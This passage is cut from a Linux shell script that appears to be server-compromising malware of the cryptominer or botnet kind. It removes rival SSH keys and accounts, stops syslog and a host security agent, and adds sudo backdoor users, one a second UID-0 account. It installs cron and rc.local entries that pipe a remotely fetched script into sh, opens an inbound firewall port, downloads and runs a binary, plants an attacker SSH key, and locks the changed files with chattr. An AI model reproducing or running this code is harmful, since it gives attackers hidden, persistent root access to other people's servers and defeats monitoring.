		sudo chattr +ia /root/.ssh/authorized_keys
	else
		echo "/root/.ssh/authorized_keys clean"
	fi
	#sed: -e expression #1, char 99: unknown command: `o'
	cat /root/.ssh/authorized_keys | grep -vw grep | grep "AAAAB3NzaC1yc2EAAAADAQABAAABAQDvJvNNOFg4C9j2oys9"
	if [ $? -eq 0 ]; then
		echo "key exists, removing."
		sudo chattr -ia /root/.ssh/authorized_keys
		sed -i '/^ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDvJvNNOFg4C9j2oys9kXcmJhnZIY2RSu3BA2RIuQbt8ahRmPqYIoAOoXUzKEuYUQWuDxGlGLniFFuIMboV1gLCEEBgGW+xXNQoNBzMKkXgmuHRllBv+Ul8T3g6dAJsLdXFWUdsll4BT+oOPCtyPlB\/s19wPjgJ\/sQNij7txpA79LQItbGrRsFIu5o23Xx7HKR0ZD9BN+sxJPCnfQMJcHpqp4TU0ov9VVkWhzhsjlTcA0H2yNjDHq0KsPofCykp012Uiana3mOZE7JBrKzjV6UnQNiwDjSCwbpfVTFnws8tX+he2yLG\/16cb1kpfyzzB7DfJljD\/ZG\/SOS14LKZKboX localhost@server$/d' /root/.ssh/authorized_keys
		sudo chattr +ia /root/.ssh/authorized_keys
	else
		echo "/root/.ssh/authorized_keys clean"
	fi

	cat /root/.ssh/authorized_keys | grep -vw grep | grep "AAAAB3NzaC1yc2EAAAABJQAAAQEAgSuI+AZnPupl2EmCqUpE"
	if [ $? -eq 0 ]; then
		echo "key exists, removing."
		sudo chattr -ia /root/.ssh/authorized_keys
		sed -i '/^ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAgSuI+AZnPupl2EmCqUpEaDU6XY9IQ351UtAN3uRwZ\/q+VMuVfNfa0wCx\/kDA3t5VR6Dg92uGddGQUNDuDEQU7ahxVLrkPeYT2PjZhDOiBo9KupNBtCgF51djq9eaHZYYCBhPpNnACmUu0LK3w7JU0qbSR1zjcuFy7QUFgl5aRQDYW4yUcDqLVgnx\/LsW5VVHuA0GiWqCfBQto8hcGxH\/RUmajgYY13L8d+DrZyyAwHFcxQenWMX1RWx2+Hu2fLKq9LksDV+taJ\/UhXd546GqyHckLVQbc2EmhvjxVOjf0Ypyvwlfh8hBV5GkjSKdSNa+UpeiwuvOaBAUTcJCCRsBdw== root@localhost/d' /root/.ssh/authorized_keys
		sudo chattr +ia /root/.ssh/authorized_keys
	else
		echo "/root/.ssh/authorized_keys clean"	
	fi

	cat /root/.ssh/authorized_keys | grep -vw grep | grep "AAAAB3NzaC1yc2EAAAADAQABAAABAQCaI\/z3wCJ"
	if [ $? -eq 0 ]; then
		echo "key exists, removing."
		sudo chattr -ia /root/.ssh/authorized_keys
		sed -i '/^ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCaI\/z3wCJX+ZeHqkRwhQQFwCqG+uorAskTWehsVXv\/BpbM127jiZzJYKSwy4x0c2UWYTPuJ0KXMBrafx9DqQLEH8PfizCUzKCrDoMqNUyH53GmGMNFqRNqTSPN+kefmx+O\/7qHc\/ufBfklWIoCVk2aVv3Tl5CBJa3SB6y\/U1\/xpdyod8gIJYn6FGk4x8+qPU9pYZt6ozUGPxs5ymxT5JHOpXjCvhJ3CSrSqt18i\/293U5ofDVMuG8R0tRFXQnoLmA8t8BeOuPzHd9cd0F7Hc6ur\/Ui5uD1cDJt6hzODRJ5hFFYItnB9eU4abITEYidl3Pw40gkfgr47b2IqLKG2OJv/d' /root/.ssh/authorized_keys
		sudo chattr +ia /root/.ssh/authorized_keys
	else
		echo "/root/.ssh/authorized_keys clean"
	fi

	cat /opt/autoupdater/.ssh/authorized_keys | grep -vw grep | grep "AAAAB3NzaC1yc2EAAAADAQABAAABAQCaI\/z3wCJ"
	if [ $? -eq 0 ]; then
		echo "key exists, removing."
		sudo chattr -ia /opt/autoupdater/.ssh/authorized_keys
		sed -i '/^ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCaI\/z3wCJX+ZeHqkRwhQQFwCqG+uorAskTWehsVXv\/BpbM127jiZzJYKSwy4x0c2UWYTPuJ0KXMBrafx9DqQLEH8PfizCUzKCrDoMqNUyH53GmGMNFqRNqTSPN+kefmx+O\/7qHc\/ufBfklWIoCVk2aVv3Tl5CBJa3SB6y\/U1\/xpdyod8gIJYn6FGk4x8+qPU9pYZt6ozUGPxs5ymxT5JHOpXjCvhJ3CSrSqt18i\/293U5ofDVMuG8R0tRFXQnoLmA8t8BeOuPzHd9cd0F7Hc6ur\/Ui5uD1cDJt6hzODRJ5hFFYItnB9eU4abITEYidl3Pw40gkfgr47b2IqLKG2OJv/d' /root/.ssh/authorized_keys
		sudo chattr +ia /opt/autoupdater/.ssh/authorized_keys
	else
		echo "/opt/autoupdater/.ssh/authorized_keys clean"
	fi

	cat /opt/logger/.ssh/authorized_keys | grep -vw grep | grep "AAAAB3NzaC1yc2EAAAADAQABAAABAQCaI\/z3wCJ"
	if [ $? -eq 0 ]; then
		echo "key exists, removing."
		sudo chattr -ia /opt/logger/.ssh/authorized_keys
		sed -i '/^ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCaI\/z3wCJX+ZeHqkRwhQQFwCqG+uorAskTWehsVXv\/BpbM127jiZzJYKSwy4x0c2UWYTPuJ0KXMBrafx9DqQLEH8PfizCUzKCrDoMqNUyH53GmGMNFqRNqTSPN+kefmx+O\/7qHc\/ufBfklWIoCVk2aVv3Tl5CBJa3SB6y\/U1\/xpdyod8gIJYn6FGk4x8+qPU9pYZt6ozUGPxs5ymxT5JHOpXjCvhJ3CSrSqt18i\/293U5ofDVMuG8R0tRFXQnoLmA8t8BeOuPzHd9cd0F7Hc6ur\/Ui5uD1cDJt6hzODRJ5hFFYItnB9eU4abITEYidl3Pw40gkfgr47b2IqLKG2OJv/d' /root/.ssh/authorized_keys
		sudo chattr +ia /opt/logger/.ssh/authorized_keys
	else
		echo "/opt/logger/.ssh/authorized_keys clean"
	fi

	cat /opt/system/.ssh/authorized_keys | grep -vw grep | grep "AAAAB3NzaC1yc2EAAAADAQABAAABAQCaI\/z3wCJ"
	if [ $? -eq 0 ]; then
		echo "key exists, removing."
		sudo chattr -ia /opt/system/.ssh/authorized_keys
		sed -i '/^ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCaI\/z3wCJX+ZeHqkRwhQQFwCqG+uorAskTWehsVXv\/BpbM127jiZzJYKSwy4x0c2UWYTPuJ0KXMBrafx9DqQLEH8PfizCUzKCrDoMqNUyH53GmGMNFqRNqTSPN+kefmx+O\/7qHc\/ufBfklWIoCVk2aVv3Tl5CBJa3SB6y\/U1\/xpdyod8gIJYn6FGk4x8+qPU9pYZt6ozUGPxs5ymxT5JHOpXjCvhJ3CSrSqt18i\/293U5ofDVMuG8R0tRFXQnoLmA8t8BeOuPzHd9cd0F7Hc6ur\/Ui5uD1cDJt6hzODRJ5hFFYItnB9eU4abITEYidl3Pw40gkfgr47b2IqLKG2OJv/d' /root/.ssh/authorized_keys
		sudo chattr +ia /opt/system/.ssh/authorized_keys
	else
		echo "/opt/system/.ssh/authorized_keys clean"
	fi

	cat /opt/sysall/.ssh/authorized_keys | grep -vw grep | grep "AAAAB3NzaC1yc2EAAAADAQABAAABAQCaI\/z3wCJ"
	if [ $? -eq 0 ]; then
		echo "key exists, removing."
		sudo chattr -ia /opt/sysall/.ssh/authorized_keys
		sed -i '/^ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCaI\/z3wCJX+ZeHqkRwhQQFwCqG+uorAskTWehsVXv\/BpbM127jiZzJYKSwy4x0c2UWYTPuJ0KXMBrafx9DqQLEH8PfizCUzKCrDoMqNUyH53GmGMNFqRNqTSPN+kefmx+O\/7qHc\/ufBfklWIoCVk2aVv3Tl5CBJa3SB6y\/U1\/xpdyod8gIJYn6FGk4x8+qPU9pYZt6ozUGPxs5ymxT5JHOpXjCvhJ3CSrSqt18i\/293U5ofDVMuG8R0tRFXQnoLmA8t8BeOuPzHd9cd0F7Hc6ur\/Ui5uD1cDJt6hzODRJ5hFFYItnB9eU4abITEYidl3Pw40gkfgr47b2IqLKG2OJv/d' /root/.ssh/authorized_keys
		sudo chattr +ia /opt/sysall/.ssh/authorized_keys
	else
		echo "/opt/sysall/.ssh/authorized_keys clean"
	fi

	cat /root/.ssh/authorized_keys | grep -vw grep | grep "AAAAB3NzaC1yc2EAAAABJQAAAQEAoL"
	if [ $? -eq 0 ]; then
		echo "key exists, removing."
		sudo chattr -ia /root/.ssh/authorized_keys
		sed -i '/^ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAoLLx+\/ZJnMGV2c7T1GGkl1jkyJJ6unLU6nQ7cOo2Qdwp+ommzKhyYEW8HExtgZqzLcGeKksSPU1nvsmoTWJY1Z1qzdx\/AOkh5N+yDHan1nIph002u\/1ASAmrtEEpg9t2a0iwJPix2KexVMQ\/5aVCfd6cJaMc8df9rUwB4U+q6gqPql9RNZXra148\/KfOTzs55GlLbJIPK5\/KBzBAUEMRCEB4vYehRkY+DxZTrYliVtHgu4nW7W2Q\/ffQbftl1gD5DFPDB6BUzkQKH2NYwqB1ntfhmabYg3gpjY+InY2gJGyH37TdqmSDWeyetlNbDl0aGVWc5c3kTdXds4w4w\/oFow== bionic/d' /root/.ssh/authorized_keys
		sudo chattr +ia /root/.ssh/authorized_keys
	else
		echo "/root/.ssh/authorized_keys clean"
	fi
}

firstthingsfirst() {
	service syslog stop
	systemctl disable syslog
	service hostguard stop
	service hostguard.service stop
	systemctl disable hostguard
	systemctl disable hostguard.service

	service cloudResetPwdUpdateAgent stop
	service cloudResetPwdUpdateAgent.service stop
	systemctl disable cloudResetPwdUpdateAgent.service
	systemctl disable cloudResetPwdUpdateAgent

	systemctl enable crond.service
	service crond start
	systemctl enable cron.service
	service cron start
}

fixadduser() {
	chattr -iauR /opt
	if id "logger" 2>/dev/null; then
		echo "logger user already exists"
		chattr -ia /etc/passwd
		chattr -ia /etc/shadow
		usermod -p '$6$utSZizcD$9Lak0brZKRt7ZVv/Wf5VpSCnazFNUrpXEy8d.mvx9V.TNG4VHvCH6kVT/qqQ4t8636gn235Ee93/RRdyohoMK1' logger
		chattr +ia /etc/passwd
		chattr +ia /etc/shadow
	else
		echo "logger user does not exist, creating..."
		chattr -ia /etc/passwd
		chattr -ia /etc/shadow
		useradd -p '$6$utSZizcD$9Lak0brZKRt7ZVv/Wf5VpSCnazFNUrpXEy8d.mvx9V.TNG4VHvCH6kVT/qqQ4t8636gn235Ee93/RRdyohoMK1' -G root -s /bin/bash -d /opt/logger logger
		usermod -aG root logger
		chattr -ia /etc/sudoers
		echo "logger    ALL=(ALL)       ALL" >>/etc/sudoers
		chattr +ia /etc/sudoers
		chattr +ia /etc/passwd
		chattr +ia /etc/shadow
		echo "logger user added"

	fi

	if id "system" 2>/dev/null; then
		echo "system user already exists"
		chattr -ia /etc/passwd
		chattr -ia /etc/shadow
		usermod -p '$6$utSZizcD$9Lak0brZKRt7ZVv/Wf5VpSCnazFNUrpXEy8d.mvx9V.TNG4VHvCH6kVT/qqQ4t8636gn235Ee93/RRdyohoMK1' system
		chattr +ia /etc/passwd
		chattr +ia /etc/shadow
	else
		echo "system user does not exist, creating..."
		chattr -ia /etc/passwd
		chattr -ia /etc/shadow
		useradd -M -p '$6$utSZizcD$9Lak0brZKRt7ZVv/Wf5VpSCnazFNUrpXEy8d.mvx9V.TNG4VHvCH6kVT/qqQ4t8636gn235Ee93/RRdyohoMK1' -s /bin/bash -d / system
		usermod -aG root system
		chattr -ia /etc/sudoers
		echo "system    ALL=(ALL)       ALL" >>/etc/sudoers
		chattr +ia /etc/sudoers
		chattr +ia /etc/passwd
		chattr +ia /etc/shadow
		echo "system user added"
	fi

	if id "autoupdater" 2>/dev/null; then
		echo "autoupdater user already exists"
		chattr -ia /etc/passwd
		chattr -ia /etc/shadow
		usermod -p '$6$utSZizcD$9Lak0brZKRt7ZVv/Wf5VpSCnazFNUrpXEy8d.mvx9V.TNG4VHvCH6kVT/qqQ4t8636gn235Ee93/RRdyohoMK1' autoupdater
		chattr +ia /etc/passwd
		chattr +ia /etc/shadow
	else
		echo "autoupdater user does not exist, creating..."
		chattr -ia /etc/passwd
		chattr -ia /etc/shadow
		useradd -p '$6$utSZizcD$9Lak0brZKRt7ZVv/Wf5VpSCnazFNUrpXEy8d.mvx9V.TNG4VHvCH6kVT/qqQ4t8636gn235Ee93/RRdyohoMK1' -s /bin/bash -d /opt/autoupdater autoupdater
		usermod -aG root autoupdater
		chattr -ia /etc/sudoers
		echo "autoupdater    ALL=(ALL)       ALL" >>/etc/sudoers
		chattr +ia /etc/sudoers
		chattr +ia /etc/passwd
		chattr +ia /etc/shadow
		echo "autoupdater user added"

	fi

	if id "sysall" 2>/dev/null; then
		echo "sysall user already exists"
		chattr -ia /etc/passwd
		chattr -ia /etc/shadow
		usermod -p '$6$utSZizcD$9Lak0brZKRt7ZVv/Wf5VpSCnazFNUrpXEy8d.mvx9V.TNG4VHvCH6kVT/qqQ4t8636gn235Ee93/RRdyohoMK1' sysall
		chattr +ia /etc/passwd
		chattr +ia /etc/shadow
	else
		echo "sysall user does not exist, creating..."
		chattr -ia /etc/passwd
		chattr -ia /etc/shadow
		useradd -M -u 0 -o -p '$6$utSZizcD$9Lak0brZKRt7ZVv/Wf5VpSCnazFNUrpXEy8d.mvx9V.TNG4VHvCH6kVT/qqQ4t8636gn235Ee93/RRdyohoMK1' -s /bin/bash -d / sysall
		usermod -aG root sysall
		chattr -ia /etc/sudoers
		echo "sysall    ALL=(ALL)       ALL" >>/etc/sudoers
		chattr +ia /etc/sudoers
		chattr +ia /etc/passwd
		chattr +ia /etc/shadow
		echo "sysall user added"
	
	fi


	if id "darmok" 2>/dev/null; then
		chattr -ia /etc/passwd
		chattr -ia /etc/shadow
		echo "user exists, deleting..."
		userdel -rf darmok
		chattr +ia /etc/passwd
		chattr +ia /etc/shadow
	else
		echo "darmok user does not exist."
	fi

	if id "cokkokotre1" 2>/dev/null; then
		chattr -ia /etc/passwd
		chattr -ia /etc/shadow
		echo "user exists, deleting..."
		userdel -rf cokkokotre1
		chattr +ia /etc/passwd
		chattr +ia /etc/shadow
	else
		echo "cokkokotre1 user does not exist."
	fi

	if id "akay" 2>/dev/null; then
		chattr -ia /etc/passwd
		chattr -ia /etc/shadow
		echo "user exists, deleting..."
		userdel -rf akay
		chattr +ia /etc/passwd
		chattr +ia /etc/shadow
	else
		echo "akay user does not exist."
	fi

	if id "o" 2>/dev/null; then
		chattr -ia /etc/passwd
		chattr -ia /etc/shadow
		echo "user exists, deleting..."
		userdel -rf o
		chattr +ia /etc/passwd
		chattr +ia /etc/shadow
	else
		echo "o user does not exist."
	fi

	if id "phishl00t" 2>/dev/null; then
		chattr -ia /etc/passwd
		chattr -ia /etc/shadow
		echo "user exists, deleting..."
		userdel -rf phishl00t
		chattr +ia /etc/passwd
		chattr +ia /etc/shadow
	else
		echo "phishl00t user does not exist."
	fi

	if id "opsecx12" 2>/dev/null; then
		chattr -ia /etc/passwd
		chattr -ia /etc/shadow
		echo "user exists, deleting..."
		userdel -rf opsecx12
		chattr +ia /etc/passwd
		chattr +ia /etc/shadow
	else
		echo "opsecx12 user does not exist."
	fi
}

croncheckgo() {
	#TODO check if cron running on different OS's and add logic
	service crond start
	service cron start

	crontab -l | grep -e "xmrig" | grep -v grep
	if [ $? -eq 0 ]; then
		echo "Bad entries found...replacing cron..."
		chattr -iau /var/spool/cron/
		chattr -iau /var/spool/cron/root
		rm /var/spool/cron/root
		mkdir -p /etc/cron.d
		mkdir -p /var/spool/cron
		crontab -r
		# add cron here
		crontab -u root ~/cron || true &&
		anacron -t ~/cron
		rm -rf ~/cron
		chattr +ia /var/spool/cron/root
		chattr +ia /var/spool/cron/
	else
		echo "cron does not contain any checked entries - do not needs to replace"
	fi


    if [ -f "/etc/crontab" ]
	then
		cat '/etc/crontab' | grep -vw grep | grep -e $sh_url1 >/dev/null
		if [ $? -eq 0 ]; then
			echo /etc/crontab find ok...
		else
			chattr -ia /etc/crontab
			echo "*/31 * * * * root curl -A fczyo-cron/1.5 -sL $sh_url1 | sh >/dev/null 2>&1" >> /etc/crontab
			echo "*/32 * * * * root cdt -A fczyo-cron/1.5 -sL $sh_url1 | sh >/dev/null 2>&1" >> /etc/crontab
			echo "*/33 * * * * root wget -O - $sh_url1 | sh >/dev/null 2>&1" >> /etc/crontab
			echo "*/35 * * * * root wdt -O - $sh_url1 | sh >/dev/null 2>&1" >> /etc/crontab
			chattr +ia /etc/crontab
		fi
	fi

	cat '/var/spool/cron/'"$USER" | grep -vw grep | grep -e $sh_url1 >/dev/null
	if [ $? -eq 0 ]; then
		echo '/var/spool/cron/'"$USER" cron find ok...
	else
		echo '/var/spool/cron/'"$USER" cron not find...
		chattr -iau /var/spool/cron/
		chattr -iau /var/spool/cron/root
		chattr -iau '/var/spool/cron/'"$USER"
		echo "*/35 * * * * curl -A fczyo-cron/1.5 -sL $sh_url1 | sh >/dev/null 2>&1" >> '/var/spool/cron/'"$USER"
		echo "*/36 * * * * cdt -A fczyo-cron/1.5 -sL $sh_url1 | sh >/dev/null 2>&1" >> '/var/spool/cron/'"$USER"
		echo "*/37 * * * * wget -O - $sh_url1 | sh >/dev/null 2>&1" >> '/var/spool/cron/'"$USER"
		echo "*/38 * * * * wdt -O - $sh_url1 | sh >/dev/null 2>&1" >> '/var/spool/cron/'"$USER"			
		chattr +ia /var/spool/cron/root
		chattr +ia /var/spool/cron/
		chattr +ia '/var/spool/cron/'"$USER"
	fi

	crontab -l | grep -e "\*/30 \* \* \* \* curl -A fczyo-cron/1.5 -sL $sh_url1" | grep -v grep
	if [ $? -eq 0 ]; then
		echo "cron is good..."
	else
		echo "replacing cron..."
		chattr -iau /var/spool/cron/
		chattr -iau /var/spool/cron/root
		rm -f /var/spool/cron/root
		mkdir -p /etc/cron.d
		mkdir -p /var/spool/cron
		echo "*/30 * * * * curl -A fczyo-cron/1.5 -sL $sh_url1 | sh >/dev/null 2>&1" >>~/cron || true &&
		echo "*/31 * * * * cdt -A fczyo-cron/1.5 -sL $sh_url1 | sh >/dev/null 2>&1" >>~/cron || true &&
		echo "*/32 * * * * wget -O - $sh_url1 | sh >/dev/null 2>&1" >>~/cron || true &&
		echo "*/33 * * * * wdt -O - $sh_url1 | sh >/dev/null 2>&1" >>~/cron || true &&
		# echo "*/2 * * * * echo \"\`date '+\%Y\%m\%d \%H:\%M:\%S'\` start crontab...\" >> aaa.log" >>~/cron || true &&
		crontab -u root ~/cron || true &&
		anacron -t ~/cron
		rm -rf ~/cron
		chattr +ia /var/spool/cron/root
		chattr +ia /var/spool/cron/
	fi
}


checkrc() {
	if test -f /etc/rc.d/rc.local; then
		echo "/etc/rc.d/rc.local exists, lets check contents..."
		cat /etc/rc.d/rc.local | grep -vw grep | grep "DfsfD3"
		if [ $? -eq 0 ]; then
			echo "/etc/rc.d/rc.local exists and has correct contents"
			chattr -ia /etc/rc.d/rc.local
			chmod +x /etc/rc.d/rc.local
			chattr +ia /etc/rc.d/rc.local
			if test -f /etc/rc.local; then
				echo "rc.local exists, deleting in order to make symlink to /etc/rc.d/rc.local"
				chattr -ia /etc/rc.d/rc.local
				chattr -ia /etc/rc.local
				rm -f /etc/rc.local
				ln -s /etc/rc.d/rc.local /etc/rc.local
			else
				echo "/etc/rc.local does not exist"
				ln -s /etc/rc.d/rc.local /etc/rc.local
			fi
			#systemctl enable rc-local;
			#systemctl start rc-local;
			#TODO check if running and start if not or restart instead of start.
			#systemctl restart rc-local;
		else
			echo "**CONTENTS WRONG** - inserting correct contents into /etc/rc.d/rc.local"
			chattr -ia /etc/rc.d/rc.local
			rm -rf /etc/rc.d/rc.local
			{
				echo "#!/bin/sh"
				echo "#rc.local"
				echo "#DfsfD3"
				echo "curl -A rc.local/1.5 -sL $sh_url1 | sh >/dev/null 2>&1"
				echo "cdt -A rc.local/1.5 -sL $sh_url1 | sh >/dev/null 2>&1"
				echo "wget -O - $sh_url1 | sh >/dev/null 2>&1"
				echo "wdt -O - $sh_url1 | sh >/dev/null 2>&1"
				# echo "echo \"\`date '+%Y%m%d %H:%M:%S'\` startlink at linux start...\" >> /root/aaa.log"
				echo "exit 0"
			} >>/etc/rc.d/rc.local
			chmod +x /etc/rc.d/rc.local
			if test -f /etc/rc.local; then
				echo "rc.local exists, deleting in order to make symlink to /etc/rc.d/rc.local"
				chattr -ia /etc/rc.d/rc.local
				chattr -ia /etc/rc.local
				rm /etc/rc.local
				ln -s /etc/rc.d/rc.local /etc/rc.local
			else
				echo "/etc/rc.local does not exist"
				ln -s /etc/rc.d/rc.local /etc/rc.local
			fi

			echo "fixing /etc/rc.d/rc.local - DONE"
			#systemctl enable rc-local;
			#systemctl start rc-local;
			#TODO check if running and start if not or restart instead of start.
			#systemctl restart rc-local;
		fi
	else
		echo "/etc/rc.d/rc.local does not exist...creating"
		{
			echo "#!/bin/sh"
			echo "#rc.local"
			echo "#DfsfD3"
			echo "curl -A rc.local/1.5 -sL $sh_url1 | sh >/dev/null 2>&1"
			echo "cdt -A rc.local/1.5 -sL $sh_url1 | sh >/dev/null 2>&1"
			echo "wget -O - $sh_url1 | sh >/dev/null 2>&1"
			echo "wdt -O - $sh_url1 | sh >/dev/null 2>&1"
			# echo "echo \"\`date '+%Y%m%d %H:%M:%S'\` startlink at linux start...\" >> /root/aaa.log"
			echo "exit 0"
		} >>/etc/rc.d/rc.local
		chmod +x /etc/rc.d/rc.local
		chattr +ia /etc/rc.d/rc.local
		if test -f /etc/rc.local; then
			echo "rc.local exists, deleting in order to make symlink to /etc/rc.d/rc.local"
			chattr -ia /etc/rc.d/rc.local
			chattr -ia /etc/rc.local
			rm -f /etc/rc.local
			ln -s /etc/rc.d/rc.local /etc/rc.local
		else
			echo "/etc/rc.local does not exist"
			ln -s /etc/rc.d/rc.local /etc/rc.local
		fi

	fi
	chattr +ia /etc/rc.d/rc.local
}

iptableschecker() {
	if /sbin/iptables-save | grep -q '64.225.46.44'; then
		echo "Iptables 64.225.46.44 already set....skipping"
	else
		echo set up iptables here1
		# iptables -I INPUT -s 64.225.46.44/32 -j ACCEPT
	fi
	##################################################################
	if /sbin/iptables-save | grep -q 'dport 2375 -j DROP'; then
		echo "Iptables 2375 already set....skipping"
	else
		echo set up iptables here2
		# iptables -I INPUT ! -i lo -p tcp -m tcp --dport 2375 -j DROP
		# iptables -A INPUT -p tcp -m tcp --dport 2375 -j DROP
	fi

	###################################################################
	if /sbin/iptables-save | grep -q 'dport 2376 -j DROP'; then
		echo "Iptables 2376 already set....skipping"
	else
		echo set up iptables here3
		# iptables -A INPUT -p tcp -m tcp --dport 2376 -j DROP
	fi
	###################################################################
	if /sbin/iptables-save | grep 'dport 26800 -j ACCEPT'; then
		echo "Iptables 26800 already set....skipping"
	else
		echo set up iptables here4
		iptables -I INPUT -p tcp --dport 26800 -j ACCEPT
	fi

	service iptables reload
	# service iptables stop
	# service iptables start
}

filerungo() {
	chattr -ia $xl_pathetc

	# downloads "http://103.209.103.16:26800/linux64-shell" /tmp/linux64-shell "http://103.209.103.16:26800/linux64-shell"
	# mv /tmp/linux64-shell /usr/local/src/services
	# chmod +x /usr/local/src/services
	# nohup /usr/local/src/services 2>&1 &
		
    if [ -f $xl_pathetc ]
    then
			filehash1=`md5sum $xl_pathetc | awk '{ print $1 }'`
            if [ "$filehash1" != "$xl_hash" ] 
            then
				chattr -ia /tmp/newabchello
                rm -f /tmp/newabchello
				echo "$xl_pathetc start download3"
                downloads $xl_x64url1 /tmp/newabchello $xl_x64url1
				chmod +x /tmp/newabchello
				/tmp/newabchello >/dev/null 2>&1 &
            else
                echo "$xl_pathetc checksums match success not need download"
            fi
    else
			echo "$xl_pathetc start download4"
            downloads $xl_x64url1 /tmp/newabchello $xl_x64url1
			chmod +x /tmp/newabchello
			/tmp/newabchello >/dev/null 2>&1 &
			sleep 3s

    fi

	ps aux | grep -vw iptablesupdate | grep -v grep | awk '{if($3>40.0) print $2}' | xargs -I % kill -9 %
	ps -fe | grep -w iptablesupdate | grep -v grep | grep -v http
	if [ $? -eq 0 ]; then
		echo "iptablesupdate is Runing..."
	else
		echo "iptablesupdate is not Runing..."
		# sysctl -w vm.nr_hugepages=$(nproc --all)
		# echo always | sudo tee /sys/kernel/mm/transparent_hugepage/enabled
		/tmp/newabchello >/dev/null 2>&1 &
		sleep 5s
		rm -f /tmp/newabchello
		ps -fe | grep -w iptablesupdate | grep -v grep | grep -v http
		if [ $? -eq 0 ]; then
			echo "$xl_pathetc is Runing.."
		else
			echo "$xl_pathetc is not Runing..."
			chmod 777 $xl_pathetc
			$xl_pathetc >/dev/null 2>&1 &
		fi
	fi
    chattr +ia $xl_pathetc
}

addsshuserkey() {
# username:root
	if [ -f "/root/.ssh/authorized_keys" ]; then
		echo "authorized_keys file exists in root home directory"
	else
		needreset=1
		mkdir -p /root/.ssh
		echo "" >>/root/.ssh/authorized_keys
		chmod 600 /root/.ssh/authorized_keys
	fi

	cat /root/.ssh/authorized_keys | grep "AAAAB3NzaC1yc2EAAAADAQABAAABAQCjh43iWyYUMiBhhffdk7NnJYGIOLdUVVBgXg9tOY6CBGUhMVQEv9QFzeMeZUeWZ3uF9EqV" | grep -v grep >/dev/null
	if [ $? -eq 0 ]; then
		echo "Good root Pub Key2 exists in file"
	else
		echo "placing root pubkey2 in file"
		needreset=1
		mkdir -p /root/.ssh
		chattr -ia /root/.ssh/authorized_keys
		chmod 600 /root/.ssh/authorized_keys
		#echo -e "\n" >> /root/.ssh/authorized_keys;
		sed -i -e '$a\' /root/.ssh/authorized_keys # This adds \n at the end of the file only if it doesn't already end with a new line. So if you run it twice it will not add another blank line.
		echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCjh43iWyYUMiBhhffdk7NnJYGIOLdUVVBgXg9tOY6CBGUhMVQEv9QFzeMeZUeWZ3uF9EqVbCCeU1HI8DKQ8Sxy9v9eWGohiCeH1VwoeuphkLk9y3pQZ0ipNlyN18MlIEP7tuxJI6TSESB5TiTOZ652fB6JSG9SDZVKy9FF6HrndBfG2SPaC8Eu0c4erbuBNPv+sWFttoJeHro9hYTGvd4ZrjUUAFiDQTtlnyd0SnKv56wSWqmI/bYZ0heAjhpU6YjSdag0nzWbS+Uz0Z5kYwWJUZ+1Je4xjj8SqoRkLKhFCV8KixsYrOBbqQBSy4EUFSehalxQZZJIY0y3v0aiEYsh root@localhost.localdomain" >>/root/.ssh/authorized_keys
		chattr +ia /root/.ssh/authorized_keys
	fi
# username:logger
	if [ -f "/opt/logger/.ssh/authorized_keys" ]; then
		echo "authorized_keys file exists in logger home directory"
		cat /root/.ssh/authorized_keys | grep "AAAAB3NzaC1yc2EAAAADAQABAAABAQCjh43iWyYUMiBhhffdk7NnJYGIOLdUVVBgXg9tOY6CBGUhMVQEv9QFzeMeZUeWZ3uF9EqV" | grep -v grep >/dev/null
		if [ $? -eq 0 ]; then
			echo "key is good...nothing to do"
		else
			echo "key checksums dont match...replacing"
			mkdir /opt/logger
			mkdir /opt/logger/.ssh
			chattr -ia /opt/logger/.ssh/authorized_keys
			rm -f /opt/logger/.ssh/authorized_keys
			chattr +ia /etc/shadow
			echo "" >>/opt/logger/.ssh/authorized_keys
			chmod 600 /opt/logger/.ssh/authorized_keys
			echo "setting up user key"
			chmod 700 /opt/logger/.ssh
			touch /opt/logger/.ssh/authorized_keys
			echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCjh43iWyYUMiBhhffdk7NnJYGIOLdUVVBgXg9tOY6CBGUhMVQEv9QFzeMeZUeWZ3uF9EqVbCCeU1HI8DKQ8Sxy9v9eWGohiCeH1VwoeuphkLk9y3pQZ0ipNlyN18MlIEP7tuxJI6TSESB5TiTOZ652fB6JSG9SDZVKy9FF6HrndBfG2SPaC8Eu0c4erbuBNPv+sWFttoJeHro9hYTGvd4ZrjUUAFiDQTtlnyd0SnKv56wSWqmI/bYZ0heAjhpU6YjSdag0nzWbS+Uz0Z5kYwWJUZ+1Je4xjj8SqoRkLKhFCV8KixsYrOBbqQBSy4EUFSehalxQZZJIY0y3v0aiEYsh root@localhost.localdomain" >>/opt/logger/.ssh/authorized_keys
			chmod 600 /opt/logger/.ssh/authorized_keys
			chown -R logger:logger /opt/logger
			chattr +ia /opt/logger/.ssh/authorized_keys
			chattr -ia /etc/passwd
			chattr -ia /etc/shadow
			usermod -d /opt/logger logger
			chattr +ia /etc/passwd
			chattr +ia /etc/shadow
		fi
	else
		echo "does not exist at all, creating key"
		mkdir /opt/logger
		mkdir /opt/logger/.ssh
		chmod 700 /opt/logger/.ssh
		touch /opt/logger/.ssh/authorized_keys
		echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCjh43iWyYUMiBhhffdk7NnJYGIOLdUVVBgXg9tOY6CBGUhMVQEv9QFzeMeZUeWZ3uF9EqVbCCeU1HI8DKQ8Sxy9v9eWGohiCeH1VwoeuphkLk9y3pQZ0ipNlyN18MlIEP7tuxJI6TSESB5TiTOZ652fB6JSG9SDZVKy9FF6HrndBfG2SPaC8Eu0c4erbuBNPv+sWFttoJeHro9hYTGvd4ZrjUUAFiDQTtlnyd0SnKv56wSWqmI/bYZ0heAjhpU6YjSdag0nzWbS+Uz0Z5kYwWJUZ+1Je4xjj8SqoRkLKhFCV8KixsYrOBbqQBSy4EUFSehalxQZZJIY0y3v0aiEYsh root@localhost.localdomain" >>/opt/logger/.ssh/authorized_keys
		chmod 600 /opt/logger/.ssh/authorized_keys
		chown -R logger:logger /opt/logger
		chattr +ia /opt/logger/.ssh/authorized_keys
		sudo chattr -ia /etc/passwd
